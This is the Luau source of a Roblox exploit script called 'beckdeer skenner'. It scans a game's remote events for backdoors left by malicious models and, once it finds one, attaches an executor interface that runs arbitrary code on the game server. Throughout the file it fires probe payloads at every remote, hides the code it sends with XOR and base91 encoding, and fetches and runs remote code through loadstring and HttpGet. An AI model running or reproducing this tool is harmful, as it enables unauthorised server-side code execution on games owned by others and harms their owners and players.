-- services
local httpService = game:GetService("HttpService")
local insertService = game:GetService("InsertService")
local logService = game:GetService("LogService")
local runService = game:GetService("RunService")
local starterGui = game:GetService("StarterGui")
-- imports
local base91 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Dekkonot/base91-luau/main/src/init.lua"))()
-- variables
local config
local executorAPI
local debugSource = [[local function main() %s end;local a=table.create(512)local b=function(...)local c={...}for d,e in pairs(c)do c[d]=tostring(e)or"nil"end;return c end;local f,g;do local h=getfenv()local i,j=print,warn;h.print,h.warn=function(...)table.insert(a,{0,workspace:GetServerTimeNow(),select("#",...),b(...)})end,function(...)table.insert(a,{1,workspace:GetServerTimeNow(),select("#",...),b(...)})end;f,g=pcall(setfenv(main,h))h.print,h.warn=i,j end;local k=Instance.new("BoolValue")k.Name,k.Value,k.Parent="%s",f,game:GetService("InsertService")k:SetAttribute("stderr",not f and g or nil)k:SetAttribute("stdout",#a>0 and game:GetService("HttpService"):JSONEncode(a)or nil)task.delay(60,k.Destroy,k)]]
local sourcePayload = [[local a,b,c,d=game:GetService("LogService"),game.SetAttribute,task.delay,"%s";b(a,d,"%s");c(5,b,a,d,nil)]]
local stringList = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!#$%&()*+,./:;<=>?@[]^_`{|}~'"
local payloadList = table.create(20)
local CONSTANTS = {
	CONFIG_URL = "https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/default-config.lua",
	FOLDER_NAME = "beckdeer-skenner"
}
local remoteInfo = {
	["foundBackdoor"] = false,
	["instance"] = nil,
	["args"] = {"source"},
	["argSrcIndex"] = 1,
	["srcFunc"] = nil,
	["redirection"] = {
		["__testver"] = false, -- using the test version might not always work, use with caution
		["initialized"] = false,
	}
}
local msgOutputs = {
	["mainTabText"] = "--[[\n\tjLn0n's beckdeer execeeter loaded!\n\tUsing 'github.com/jLn0n/executor-gui' for interface.\n\n\tDocumentation: github.com/jLn0n/beckdeer-skenner/blob/main/README.MD\n\tCommunity server: https://discord.gg/jvb7XNzNPN \n--]]\n",

	["attached"] = "\n Attached Remote: %s\n Type: %s\n Payload: %s",
	["cacheLoaded"] = "Place cache of [%s] has been loaded.",
	["printRemote"] = "\n Remote: %s | [%s]\n Type: %s",

	["scanMsg1"] = "Remote scanning has been started.",
	["scanMsg2"] = "You could see the remotes being scanned in the Developer Console if config.enableLogging is set to true.",
	["scanBenchmark"] = "Took %.2f second(s) to scan remotes.",

	["cacheFailed"] = "Failed to load the backdoor cache of [%s], it might be outdated.",
	["outdatedConfig"] = "The configuration file is outdated!\nIt is recommended to update the configuration to prevent errors.",
	["configLoadFailed"] = "Local configuration failed to load, it might be corrupted.",
	["noBackdoorRemote"] = "No backdoored remote(s) can be found here!",
	["remoteRedirectLoadFailed"] = "Remote redirection failed to load, using original remote.",
}
local msgBoxParams = {
	["DiscordInvitePrompt"] = {
		Title = "Discord Invite Prompt",
		TextContent = "Would you like to join our discord community server?",
		ButtonCount = 2,
	},
	["DiscordInviteCopied"] = {
		Title = "Discord Invite Prompt",
		TextContent = "Copied discord server invite URL.",
		ButtonCount = 1,
		Button0Text = "OK"
	}
}
local stringifiedTypes = {
	EnumItem = function(value)
		return string.format("Enum.%s.%s", value.EnumType, value.Name)
	end,
	CFrame = function(value)
		return string.format("CFrame.new(%s)", tostring(value))
	end,
	Vector3 = function(value)
		return string.format("Vector3.new(%s)", tostring(value))
	end,
	BrickColor = function(value)
		return string.format("BrickColor.new(\"%s\")", value.Name)
	end,
	Color3 = function(value)
		return string.format("Color3.new(%s)", tostring(value))
	end,
	string = function(value)
		return `"{value}"`
	end,
	number = function(value)
		return string.format("%2.f", value)
	end,
	Ray = function(value)
		return string.format("Ray.new(Vector3.new(%s), Vector3.new(%s))", tostring(value.Origin), tostring(value.Direction))
	end
}
-- functions
local get_thread_identity = (syn and syn.get_thread_identity) or getthreadidentity
local set_thread_identity = (syn and syn.set_thread_identity) or setthreadidentity

local _getDebugIdFunc = clonefunction(game.GetDebugId)
local function getDebugId(instanceObj)
	local oldThreadIdentity = get_thread_identity()
	set_thread_identity(7)
	local debugId = _getDebugIdFunc(instanceObj)
	set_thread_identity(oldThreadIdentity)
	return debugId
end

local function newNotification(msgText)
	return starterGui:SetCore("SendNotification", {
		Title = "[jLn0n's beckdeer skenner]",
		Text = msgText,
		Duration = (5 + (#msgText / 80))
	})
end

local function logToConsole(logType: "print" | "warn", ...)
	if not config.enableLogging then return end
	local logFunc = (
		if logType == "print" then
			print
		elseif logType == "warn" then
			warn
		else print
	)

	return logFunc(...)
end

local function getFullNameOf(object)
	if not object then return end
	local currentInstance = object
	local result = ""

	while currentInstance ~= game do
		local currentName = (if currentInstance then currentInstance.Name else nil)
		if not currentName then break end

		local concatenatedStr = (
			if (not string.match(currentName, "^[%w_]+$")) then
				`["{currentName}"]`
			else `.{currentName}`
		)
		result = concatenatedStr .. result
		currentInstance = currentInstance.Parent
	end
	result = string.sub(result, 2)
	return result
end

local function pathToInstance(strPath)
	if not strPath then return end
	local subPaths do
		subPaths = table.create(0)

		for matchedStr in string.gmatch(strPath, "[^%.]+") do -- TODO: handle ServerScriptService[\"Test 1\"][\"Test 2\"]
			local subPath1 = string.gsub(matchedStr, "(.+)%[\"(.-)\"%]", "%1")
			local subPath2 = string.gsub(matchedStr, "(.+)%[\"(.-)\"%]", "%2")

			table.insert(subPaths, subPath1)
			if (subPath1 == subPath2 and matchedStr == subPath1) then continue end
			table.insert(subPaths, subPath2)
		end
	end
	local result = game

	for _, pathName in subPaths do
		if not result then return end
		result = result:WaitForChild(pathName, 1)
	end
	return result
end

local function mergeArray(t1, t2)
	t1 = table.clone(t1)

	for index, value in t2 do
		value = (if typeof(value) == "table" then table.clone(value) else value)
		table.insert(t1, value)
	end
	return t1
end

local function generateRandString(lenght, lettersOnly)
	local result = ""
	local strTotalLenght = (if lettersOnly then 52 else #stringList)

	for _ = 1, lenght do
		local randInteger = math.random(1, strTotalLenght)
		result ..= string.sub(stringList, randInteger, randInteger)
	end
	return result
end

local function notSameRandNumber(min, max, ...)
	local numIndexes = {...}
	local randNumber = math.random(min, max)

	task.defer(table.clear, numIndexes) -- optimization!?!!?
	return (
		if not table.find(numIndexes, randNumber) then
			randNumber
		else notSameRandNumber(min, max, ...)
	)
end

local function waitUntil(waitTime, condition)
	local startTime = os.clock()
	repeat runService.Heartbeat:Wait() until condition() or (os.clock() - startTime) > waitTime
end

local function isRemoteAllowed(object)
	if not (typeof(object) == "Instance" and (object:IsA("RemoteEvent") or object:IsA("RemoteFunction"))) then
		return false
	end

	for filterName, filterFunc in config.remoteFilters do
		if filterFunc and not filterFunc(object) then continue end
		return false
	end
	return true
end

local function getRemotes()
	local remotes = table.create(128)
	local instancesList = mergeArray(
		game:GetDescendants(),
		(if getinstances then getinstances() else {})
	)

	for _, object in instancesList do
		if not isRemoteAllowed(object) then continue end
		local remoteObjId = getDebugId(object)
		remotes[remoteObjId] = object
	end
	return remotes
end

local function getStringifiedType(value)
	local stringifier = stringifiedTypes[typeof(value)]

	return (
		if stringifier then
			stringifier(value)
		else tostring(value)
	)
end

local function applyMacros(source)
	for macroName, macroValue in config.scriptMacros do
		macroValue = getStringifiedType(
			if typeof(macroValue) == "function" then
				macroValue(macroValue)
			else macroValue
		)
		source = string.gsub(source, `%%{macroName}%%`, macroValue)
	end
	return source
end

local function getRemoteFunc(remoteObj)
	return (
		if remoteObj:IsA("RemoteEvent") then
			remoteObj.FireServer
		elseif remoteObj:IsA("RemoteFunction") then
			remoteObj.InvokeServer
		else nil
	)
end

local applyRedirectedRemoteSecurity do
	local userId = game:GetService("Players").LocalPlayer.UserId

	-- simple XOR encryption algorithm, nothing special
	local function XORSource(source: string, key: number): string
		local randomObj = Random.new(key)
		local result = ""
		local randX, randY, randZ =
			randomObj:NextInteger(0, 128),
			randomObj:NextInteger(0, 96),
			randomObj:NextInteger(0, 32)

		for idx = 1, #source do
			local charByte = string.byte(source, idx, idx)
			local offset = ((idx % randomObj:NextInteger(0, randX)) + randomObj:NextInteger(0, randY))
			charByte = bit32.bxor(offset, charByte, randomObj:NextInteger(0, randZ))

			result ..= string.char(charByte)
		end
		result = string.gsub(result, ".", function(value) return string.format("%02X", string.byte(value)) end)
		return result
	end

	function applyRedirectedRemoteSecurity(source)
		if not config.redirectRemote then return end
		local argsLenght = math.random(12, 32)
		local generatedArgs = table.create(argsLenght)
		local verificationIdx = math.random(4, (argsLenght - 1))
		local srcArgIdx = notSameRandNumber(2, (argsLenght - 2), verificationIdx)
		local randIdx = notSameRandNumber(2, (argsLenght - 3), srcArgIdx, verificationIdx)
		local nonceIdx = notSameRandNumber(2, (argsLenght - 3), srcArgIdx, verificationIdx, randIdx)
		local nonceOffset = Random.new((argsLenght / verificationIdx) % (verificationIdx * 2)):NextInteger(8, argsLenght)
		local XORKey = math.ceil(((((argsLenght / randIdx) % verificationIdx) * nonceIdx) * (userId * srcArgIdx)) * nonceOffset)

		generatedArgs[1] = (
			if (math.random(1, 2) == 2) then
				generateRandString(verificationIdx)
			else verificationIdx
		)
		generatedArgs[verificationIdx] = true -- sets a boolean at idx `verificationIdx`
		generatedArgs[srcArgIdx] = base91.encodeString(XORSource(source, XORKey))
		generatedArgs[randIdx] = srcArgIdx -- sets the value `srcArgIdx` to `randIdx`
		generatedArgs[nonceIdx] = `\127@{generateRandString(randIdx + nonceOffset)}` -- generates a nonce that is the lenght of `randIdx`

		for argIndex = 2, argsLenght do -- inserts random jibberish
			if typeof(generatedArgs[argIndex]) ~= "nil" then continue end
			local valueType = math.random(1, 3)

			generatedArgs[argIndex] = (
				if valueType == 1 then
					generateRandString(math.random(12, 512))
				elseif valueType == 2 then
					math.random(0, 0x7fffffff)
				elseif valueType == 3 then
					math.random(1, 10) > 5
				else nil
			)
		end
		return generatedArgs
	end
end

local function execScript(source, noRedirectOutput)
	if not remoteInfo.foundBackdoor then return end
	source = applyMacros(source)
	local remoteFunc = getRemoteFunc(remoteInfo.instance)
	local remoteArgs = table.clone(remoteInfo.args)

	if (config.redirectOutput and not noRedirectOutput) then
		local nonce = generateRandString(32)
		source = string.format(debugSource, source, nonce)

		local connection
		connection = insertService.ChildAdded:Connect(function(object)
			if object.Name ~= nonce then return end connection:Disconnect()

			local rawStdout = object:GetAttribute("stdout")
			local jsonConverted, stdout = pcall(httpService.JSONDecode, httpService, rawStdout)

			if jsonConverted then
				for _, output in stdout do
					local outputType, timestamp = (
						if output[1] == 0 then
							Enum.MessageType.MessageOutput
						elseif output[1] == 1 then
							Enum.MessageType.MessageWarning
						else nil
					), output[2]
					local outputMsg = ""
					for index = 1, output[3] do
						outputMsg ..= `{tostring(output[4][index]) or nil} `
					end

					executorAPI.console.createOutput(outputMsg, outputType, timestamp)
				end
			end

			if not object.Value then
				executorAPI.console.createOutput(object:GetAttribute("stderr") or "Error occured, no output from Lua.", Enum.MessageType.MessageError)
			end
		end)
		task.delay(60, connection.Disconnect, connection)
	end

	if (config.redirectRemote and remoteInfo.redirection.initialized) then
		remoteArgs = applyRedirectedRemoteSecurity(source)
	else
		source = (if remoteInfo.srcFunc then remoteInfo.srcFunc(source) else source)
		remoteArgs[remoteInfo.argSrcIndex] = source
	end
	task.spawn(remoteFunc, remoteInfo.instance, unpack(remoteArgs))
end

local function initializeRemoteInfo(params, overwriteRemoteInfo)
	if (remoteInfo.foundBackdoor and not overwriteRemoteInfo) then return end

	remoteInfo.foundBackdoor = true
	for name, value in params do
		remoteInfo[name] = value
	end
end

local function initRemoteRedirection()
	if not (remoteInfo.foundBackdoor and (config.redirectRemote and not remoteInfo.redirection.initialized)) then return false end
	local nonce = generateRandString(32, true)

	execScript(`require({if remoteInfo.redirection.__testver then 11906414795 else 11906423264})("{nonce}", %userid%)`, true) -- if you wanna try out new features, set 'remoteInfo.redirection.__testver' to true
	waitUntil(5, function() return insertService:GetAttribute(nonce) end) -- we need to improvise until :WaitForAttribute is added
	local redirectedRemotePath = insertService:GetAttribute(nonce)

	if not redirectedRemotePath then return newNotification(msgOutputs.remoteRedirectLoadFailed) end
	local redirectedRemote = pathToInstance(redirectedRemotePath)

	if redirectedRemote and
		redirectedRemote:IsA("RemoteEvent") and
		redirectedRemote:GetAttribute("isNonced")
	then
		remoteInfo.redirection.initialized = true

		initializeRemoteInfo({
			["instance"] = redirectedRemote,
			["args"] = {"source"},
			["argSrcIndex"] = 1
		}, true)

		insertService:GetAttributeChangedSignal(nonce):Connect(function()
			local newPath = insertService:GetAttribute(nonce)
			if not newPath then return end
			local newRemote = pathToInstance(newPath)

			if newRemote and
				newRemote:IsA("RemoteEvent") and
				newRemote:GetAttribute("isNonced")
			then
				remoteInfo.instance = newRemote
			end
		end)
		return true
	else
		newNotification(msgOutputs.remoteRedirectLoadFailed)
		return false
	end
end

local function initializeDiscordInvite(inviteCode: string)
	if config.__STOPINVITEPROMPT then return end
	local http_request = (syn and syn.request) or (http and http.request) or request or http_request

	local msgBoxResult = executorAPI.misc.newMessageBox("Default", msgBoxParams.DiscordInvitePrompt)
	if msgBoxResult.ClickedButton == 0 then
		local promptRequest = (
			if http_request then
				http_request({
					Url = "http://127.0.0.1:6463/rpc?v=1",
					Method = "POST",

					Headers = {
						["Content-Type"] = "application/json",
						["Origin"] = "https://discord.com"
					},
					Body = httpService:JSONEncode({
						["args"] = {["code"] = inviteCode},
						["cmd"] = "INVITE_BROWSER",
						["nonce"] = httpService:GenerateGUID()
					})
				})
			else nil
		)

		if not promptRequest or (promptRequest.StatusCode ~= 200 or httpService:JSONDecode(promptRequest.Body).data.code == 4011) then
			setclipboard(`https://discord.gg/{inviteCode}`)
			executorAPI.misc.newMessageBox("Default", msgBoxParams.DiscordInviteCopied)
			return
		end
	end
end

local function onAttached(remoteInfoParams)
	if (remoteInfo.foundBackdoor and remoteInfo.instance) then return end
	initializeRemoteInfo(remoteInfoParams)
	newNotification("Attached!")
	logToConsole("warn", string.format(msgOutputs.attached, getFullNameOf(remoteInfoParams.instance), remoteInfoParams.instance.ClassName, remoteInfoParams.payloadName or "nil"))
	initRemoteRedirection()

	executorAPI = loadstring(game:HttpGet("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))({
		mainTabText = msgOutputs.mainTabText,
		customExecution = true,
		executeFunc = function(source) return execScript(source) end,
	})
	task.spawn(initializeDiscordInvite, "jvb7XNzNPN")

	for _, scriptSrc in config.autoExec do
		execScript(scriptSrc)
	end
end

local function testRemote(nonce, remoteObj, remoteObjId)
	local remoteObjFunc = getRemoteFunc(remoteObj)

	for payloadIndex, payloadInfo in payloadList do runService.Heartbeat:Wait()
		local remotePassed = (if payloadInfo.Verifier then payloadInfo.Verifier(remoteObj) else true)
		if (not remotePassed or not payloadInfo.Args) then continue end

		local currentPayload = table.clone(payloadInfo.Args)
		local argSrcIdx = table.find(currentPayload, "source")
		if not argSrcIdx then continue end

		currentPayload[argSrcIdx] = string.format(sourcePayload, nonce, `{remoteObjId}|{payloadInfo.Name}`)
		pcall(task.spawn, remoteObjFunc, remoteObj, unpack(currentPayload))
	end
end

local function scanBackdoors()
	if remoteInfo.foundBackdoor then return end
	local remotesList = getRemotes()
	local nonce = generateRandString(32, true)

	local connection;
	connection = logService.AttributeChanged:Connect(function(attributeName)
		if attributeName ~= nonce then return end connection:Disconnect()
		local remoteResult = string.split(logService:GetAttribute(nonce), "|")
		local remoteObj = remotesList[remoteResult[1]]
		local payloadInfo = config.backdoorPayloads[remoteResult[2]]

		task.spawn(onAttached, {
			["instance"] = remoteObj,
			["args"] = payloadInfo.Args,
			["argSrcIndex"] = table.find(payloadInfo.Args, "source"),
			["payloadName"] = remoteResult[2]
		})
	end)

	for remoteObjId, remoteObj in remotesList do runService.Heartbeat:Wait()
		if remoteInfo.foundBackdoor then break end

		logToConsole("print", string.format(msgOutputs.printRemote, getFullNameOf(remoteObj), remoteObjId, remoteObj.ClassName))
		testRemote(nonce, remoteObj, remoteObjId)
	end

	waitUntil(2.5, function() return not connection.Connected end)
	task.defer(connection.Disconnect, connection)
end
-- main
do -- config initialization
	if not isfolder(CONSTANTS.FOLDER_NAME) then
		makefolder(CONSTANTS.FOLDER_NAME)
	end

	local rawConfigFile = (
		if isfile(`{CONSTANTS.FOLDER_NAME}/config.lua`) then
			readfile(`{CONSTANTS.FOLDER_NAME}/config.lua`)
		else game:HttpGet(CONSTANTS.CONFIG_URL)
	)
	local loadSuccess, loadedConfig do
		loadSuccess, loadedConfig = pcall(loadstring(rawConfigFile))

		if (not loadSuccess) then
			newNotification(msgOutputs.configLoadFailed)
			rawConfigFile = game:HttpGet(CONSTANTS.CONFIG_URL)
			loadedConfig = loadstring(rawConfigFile)()
		end
	end
	local successCount = 0

	successCount += (if typeof(loadedConfig.autoExec) == "table" then 1 else 0)
	successCount += (if typeof(loadedConfig.remoteFilters) == "table" then 1 else 0)
	successCount += (if typeof(loadedConfig.scriptMacros) == "table" then 1 else 0)
	successCount += (if typeof(loadedConfig.backdoorPayloads) == "table" then 1 else 0)
	successCount += (if typeof(loadedConfig.cachedPlaces) == "table" then 1 else 0)

	if (loadedConfig.configVer < 9 or successCount < 5) then newNotification(msgOutputs.outdatedConfig) end
	config = loadedConfig

	for payloadName, payloadInfo in config.backdoorPayloads do
		local payloadInfoClone = table.clone(payloadInfo)
		payloadInfoClone.Name = payloadName

		table.insert(payloadList, payloadInfoClone)
	end

	table.sort(payloadList, function(tbl1, tbl2)
		local tbl1Priority, tbl2Priority =
			math.clamp((tbl1.Priority or 1024), 1, 1024), math.clamp((tbl2.Priority or 1024), 1, 1024)
		return tbl1Priority < tbl2Priority
	end)
end
do -- backdoor finding
	local placeCacheData = config.cachedPlaces[game.PlaceId]

	if placeCacheData then
		local successCount = 0
		local remoteObj = (if typeof(placeCacheData.Remote) == "string" then pathToInstance(placeCacheData.Remote) else placeCacheData.Remote)
		local argSrcIndex = (if typeof(placeCacheData.Args) == "table" then table.find(placeCacheData.Args, "source") else nil)

		successCount += (if (typeof(remoteObj) == "Instance" and (remoteObj:IsA("RemoteEvent") or remoteObj:IsA("RemoteFunction"))) then 1 else 0)
		successCount += (if typeof(argSrcIndex) == "number" then 1 else 0)

		if successCount >= 2 then
			newNotification(string.format(msgOutputs.cacheLoaded, game.PlaceId))
			onAttached({
				["instance"] = remoteObj,
				["srcFunc"] = placeCacheData.SourceFunc,
				["args"] = placeCacheData.Args,
				["argSrcIndex"] = argSrcIndex
			})
		else
			newNotification(string.format(msgOutputs.cacheFailed, game.PlaceId))
		end
	else
		local startTime = os.clock()

		newNotification(msgOutputs.scanMsg1);newNotification(msgOutputs.scanMsg2)
		scanBackdoors()
		newNotification(string.format(msgOutputs.scanBenchmark, os.clock() - startTime))

		if not remoteInfo.foundBackdoor then -- if no backdoor found
			logToConsole("warn", msgOutputs.noBackdoorRemote)
			newNotification(msgOutputs.noBackdoorRemote)
		end
	end
end
